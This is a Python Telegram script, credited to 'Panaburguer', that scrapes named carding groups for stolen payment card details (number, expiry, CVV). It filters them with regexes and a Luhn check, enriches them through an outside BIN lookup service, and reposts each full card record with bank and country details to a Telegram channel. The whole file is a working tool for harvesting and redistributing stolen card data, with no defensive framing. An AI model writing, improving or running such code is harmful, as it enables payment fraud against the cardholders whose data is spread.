from telethon.sync import TelegramClient
from telethon import events
from telethon.tl.custom import Button
from telethon import TelegramClient, events
from colorama import Cursor, init, Fore
from time import sleep
from luhn import *
import requests
import time
import re
import os
import random
from telethon.tl.types import InputMediaPoll, Poll, PollAnswer

init()

chat_scraped = ['VegetaScrap', 'ChkBotLand', 'X-Force', 'darkachat', ' ', 'LalaScrap', 'xforce_group8', 'savagegroupoficial', 'binsofolimpus', 'BINEROS_CCS2', -1001174204744, -1001237062995, -1001384666786, -1001537198434]

posting_channel = -1001873953413
parse_mode = 'html'
file_db = 'text.txt'

def banner():
    print(Fore.RED + '''

  ██████  ▄████▄   ██▀███   ▄▄▄       ██▓███  ▓█████  ██▀███  
▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ░  ░░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░          ░░   ░   ░   ▒   ░░          ░     ░░   ░ 
      ░  ░ ░         ░           ░  ░            ░  ░   ░     
         ░                                                   
''' + Fore.MAGENTA + 'By: Panaburguer' + Fore.RESET)
    
def check_string(file, text):
    with open(file) as temp_f:
        datafile = temp_f.readlines()
    for line in datafile:
        if text in line:
            return True
    return False 

file = open(file_db, "w")
file.write("Start Scraper\n")
file.close()
banner()

try:
    file = open('api.txt','r')
    apis = file.readlines()
except:
    file = open('api.txt','w')
    file.close()
    file = open('api.txt','r')
    apis = file.readlines()
if apis == []:
    api_id = int(input("APIID : "))
    api_hash = input("APIHASH : ")
    api_id = int(str(api_id).replace(' ',''))
    api_hash = api_hash.replace(' ','')
    file = open('api.txt', 'w')
    file.write(str(api_id) + '\n' + api_hash)
    file = file.close()
    ewdewde = input("\nPress enter to continue.")
    os.system('clear || cls')    
elif len(apis) == 2:
    api_id = int(apis[0])
    api_hash = apis[1]
    print ("APIID : " + str(api_id))
    print ("APIHASH : " + api_hash) 
    print(Fore.LIGHTCYAN_EX + "\nIf you want to change your API delete api.txt.")
    ewdewde = input("\nPress enter to continue.")
    os.system('clear || cls')
print("Imputing S3xyDatabase..")

for chat in chat_scraped:
    with TelegramClient('scraper', api_id, api_hash) as client:
        client.parse_mode = parse_mode
        for message in client.iter_messages(chat):
            try:
                filtron = "[0-9]{16}[|][0-9]{1,2}[|][0-9]{2,4}[|][0-9]{3}"
                filtroa = "[0-9]{15}[|][0-9]{1,2}[|][0-9]{2,4}[|][0-9]{4}"
                detectavisa = "[0-9]{16}"
                detectamex = "[0-9]{15}"
                try:
                    sacanumvisa = re.findall(detectavisa, message.text)
                    carduno = sacanumvisa[0]
                    tipocard = str(carduno[0:1])
                except:
                    sacanumamex = re.findall(detectamex, message.text)
                    carduno = sacanumamex[0]
                    tipocard = str(carduno[0:1])

                if tipocard == "3":
                    x = re.findall(filtroa, message.text)[0]
                elif tipocard == "4":
                    x = re.findall(filtron, message.text)[0]
                elif tipocard == "5":
                    x = re.findall(filtron, 
                    message.text)[0]
                elif tipocard == "6":
                    x = re.findall(filtron, message.text)[0]

                lunh = verify(x.split("|")[0])

                extra = x[0:12]+"xxxx"
                                    
                bin = x[0:6]
                                                                    
                bin_data = requests.get('https://binlookup-1.andrexxone.repl.co/index.php?bin='+ x.split("|")[0][0:6]).json()
                country = bin_data["country"]["name"]
                flag = bin_data["country"]["flag"]
                vendor = bin_data["brand"]
                tipo = bin_data["type"]
                level = bin_data["level"]
                bank_name = bin_data["bank"]["name"]
                currency = bin_data["country"]["currency"]
        
                explode = x.split('|')
                cc = explode[0] 
                mes = explode[1]
                if len(mes)==1:mes="20"+ mes
                ano = explode[2] 
                cvv = explode[3]
                
                path=(r"C:\carpetas\S3xyDrops\bfotosrandom")
                fotorandom = random.choice([
    os.path.join(path, x)  # <- new
    for x in os.listdir(path)  # <- better to avoid repeating dir
    if os.path.isfile(os.path.join(path, x))
])
                
                card_send_formatted = f'''  
         𝑻𝒐𝒕𝒐𝒅𝒓𝒊𝒍𝒆 𝑺𝒄𝒓𝒂𝒑𝒑𝒆𝒓
┏━━━━━━•(=^●ω●^=)•━━━━━━┓
 ↯ 𝐂𝐚𝐫𝐝: <code>{x}</code>
 ↯ 𝐄𝐱𝐭𝐫𝐚: <code>{extra}|{mes}|{ano}|rnd</code>
 ↯ 𝐁𝐢𝐧: <b><code>{bin}</code></b>
 ↯ 𝐈𝐧𝐟𝐨: <code>{vendor} - {tipo} - {level}</code>
 ↯ 𝐁𝐚𝐧𝐤: <code>{bank_name}</code> 
 ↯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} {flag}</code> - <code>{currency}</code>
┗━━━━━━•(=^●ω●^=)•━━━━━━┛
'''

                print(f'Orange Cat => {x}|@panaburguer')
                if lunh is True:
                            if check_string(file_db, x) is False:
                                time.sleep(3)
                                client.send_message(posting_channel, card_send_formatted, file=fotorandom)
                                f = open(file_db, 'a')
                                f.write(f"{x}\n")
                                f.close() 
            except Exception as e:
                pass